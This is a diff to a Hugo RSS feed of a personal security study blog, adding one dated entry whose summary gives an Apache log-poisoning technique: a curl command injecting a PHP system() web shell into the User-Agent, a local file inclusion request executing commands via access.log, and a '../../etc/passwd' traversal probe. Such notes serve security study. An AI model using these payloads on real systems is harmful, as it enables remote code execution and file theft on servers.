@@ -6,7 +6,18 @@
     <description>Recent content in Study_books on Olist.213</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>zh-cn</language>
-    <lastBuildDate>Sat, 15 May 2021 11:54:25 +0800</lastBuildDate><atom:link href="https://olist213.github.io/study_book/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Sun, 16 May 2021 18:49:11 +0800</lastBuildDate><atom:link href="https://olist213.github.io/study_book/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Time 2021 05 16</title>
+      <link>https://olist213.github.io/study_book/time-2021-05-16/</link>
+      <pubDate>Sun, 16 May 2021 18:49:11 +0800</pubDate>
+      
+      <guid>https://olist213.github.io/study_book/time-2021-05-16/</guid>
+      <description>RCE via Apache logs  Poison the User-Agent in access logs: $ curl &amp;lt;http://example.org/&amp;gt; -A &amp;#34;&amp;lt;?php system(\\$_GET[&amp;#39;cmd&amp;#39;]);?&amp;gt;&amp;#34; Note: The logs will escape double quotes so use single quotes for strings in the PHP payload. Then request the logs via the LFI and execute your command. $ curl &amp;lt;http://example.org/test.php?page=/var/log/apache2/access.log&amp;amp;cmd=id&amp;gt;   windows_baseline
+ windows基线脚本（powershell）    emergency-response-checklist
+ 应急响应指南    GET /page.php?path=../../etc/passwd Forbidden 403 ? Try One Of These: (1).</description>
+    </item>
+    
     <item>
       <title>Time 2021 05 15 httpx naabu subfinder</title>
       <link>https://olist213.github.io/study_book/time-2021-05-15/</link>
